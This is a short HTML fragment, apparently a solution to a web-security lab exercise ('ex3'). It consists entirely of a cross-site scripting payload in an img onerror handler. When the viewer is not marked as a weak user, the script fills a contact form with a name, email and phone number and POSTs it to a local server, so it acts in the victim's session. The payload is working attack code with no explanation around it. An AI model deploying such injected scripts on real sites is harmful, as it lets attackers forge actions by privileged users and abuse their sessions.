<img src="pic.jpg" onerror="
var p = window.document.querySelectorAll('p');
let flag = false;
p.forEach( par => {
    if (par.innerHTML === 'אתה מחובר כמשתמש חלש!') {
        flag = true;
    }
});
if (!flag){
    window.document.getElementById('name').value='liran';
    window.document.getElementById('email').value='liran@gmail.com';
    window.document.getElementById('subject').value='ex3';
    window.document.getElementById('phone_number').value='0536204838';
    window.document.getElementById('message').value='ex3 solution';
    var formData = new FormData( window.document.getElementById('contact-form') );
    var xml = new XMLHttpRequest();
    var url = 'https://localhost:5000/request';
	xml.open('POST', url);
	xml.send(formData);
}
"